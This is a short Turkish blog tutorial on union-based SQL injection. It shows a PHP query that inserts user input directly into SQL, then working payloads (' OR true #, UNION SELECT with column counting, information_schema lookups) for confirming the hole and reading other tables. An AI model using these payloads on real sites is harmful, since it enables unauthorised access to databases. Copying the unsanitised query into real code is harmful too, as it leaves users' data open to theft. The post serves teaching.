---
ID: 239
post_title: Union SQL injection
author:
  - farukcan
post_date:
  - 2015-08-12 10:09:49
post_excerpt:
  - ""
layout: post
permalink:
  - ""
published: true
dsq_thread_id:
  - "4135047264"
---

SQL injection açığı bulunan bir sitede , union komutu kullanılarak, diğer tablolardanda bilgi alma biçimidir.

sunucu tarafından şöyle bir açık olduğu varsayılsın
<pre>$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";</pre>
bu durumda
<pre>' OR true #</pre>
ile sql injection olduğundan emin olunur.
<pre>' UNION SELECT * FROM diger_tablo #</pre>
ile diğer tablolara erişibilir.

Fakat şöyle bir sorun çıkabilir : Tabloların kolon sayıların eşit olmaması.
<pre>' OR true UNION SELECT 1,2,3 #</pre>
Biçiminde tek tek deneyerek, mevcut tablonun kolon sayısını elde edebilirsiniz.
<h2>Not</h2>
Eğer tablo isimlerini ve kolonlarını öğrenmek isterseniz. Aşağıdaki sorgularla aynı yöntemi deneyebilirsiniz
<pre><code>select * from information_schema.`TABLES`</code></pre>
<pre><code>select TABLE_NAME from information_schema.`TABLES` </code></pre>
<pre><code>select TABLE_NAME,COLUMN_NAME from information_schema.`COLUMNS`</code></pre>